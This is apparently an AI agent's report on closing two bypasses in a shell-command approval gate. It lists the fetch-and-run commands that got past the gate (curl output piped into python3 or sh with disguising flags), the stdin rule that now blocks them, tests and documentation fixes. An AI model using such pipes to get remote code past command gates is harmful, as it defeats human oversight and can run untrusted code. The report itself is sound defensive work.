Both of astra's stdin bypasses are closed and committed as `59cacdd` on `lane/l2-gate` (not pushed). `npm test` exits 0.

**Before the fix** (scratch harness, at `c1b1a11`), I reproduced both bypasses first:
- `curl u | python3 - --version` with allows `[^curl, ^python3]` → **ALLOW**
- `curl u | sh -s -- --help` with allows `[^curl, ^sh]` → **ALLOW**
- The two controls were already right: `echo x | python3 --version` → ALLOW, `curl u | python3 -W ignore` → BLOCK.

**After the fix:** both bypasses → **BLOCK**. `echo x | python3 --version` → ALLOW, `-W ignore` → BLOCK. Both probe scripts (`/tmp/l2-gate-probe.mjs`, `/tmp/l2-gate2-probe.mjs`) give output identical to their earlier saved `.out` files.

**Rule as implemented** (`gate-shell.ts`, around line 252):
- An explicit stdin indicator (`-`, which also covers `-c -`; `/dev/stdin`; `/dev/fd/0`; a shell's `-s`) anywhere in the arguments means stdin is read. Nothing after it can cancel that.
- Otherwise, `--version`/`--help` (and `-V` for non-shells) cancel the floor only if they appear as options before the first operand or `--`.
- Option scanning stops at `--`. Stdin is then assumed only if nothing follows it.

**Corpus:** 8 rows that must BLOCK and 4 that must ALLOW, all under allow patterns that match the receiving command (`^python3`, `^sh`, `^bash`) as well as `^curl`.

**Publication fixes:**
1. The nana-pack README no longer says the caps "bound everything else". It now says:
   - 200 is per source list per load, and denies added by live tightenings form an uncapped session union.
   - 64 KB bounds only whether an exception can apply.
   - There is no global work bound.
2. `apps/desk/README.md` now quotes the shipped label, "allow (exempt matching segment; not the floor)".
3. The nana-pack README and `AGENTS.md` now describe owner recovery for both the user and trusted-project scopes, for malformed or over-cap blocks: edit the named file outside pi, or delete it. Deleting it means defaults and discards that scope's custom denies.
4. Added a README note on the interpreter-argument limitation.

**Test summary:** 64 files: 63 pass, 0 fail, 1 skip; 2,996 checks passed.

**Residuals:**
- The option-arity table is maintained by hand. An unknown option that takes a value can have its value mistaken for a script file, so that command is not floored.
- A `-` or `-s` anywhere still floors, even when it isn't really a stdin indicator. That is deliberately strict.
- I left the old label in the bench fixture copy of `app.js`, because it is a historical snapshot.

**Claim most likely wrong:** "an uncapped session union after live tightenings" comes from astra's ruling. I did not re-check it against the config code this round.

VERDICT: DONE
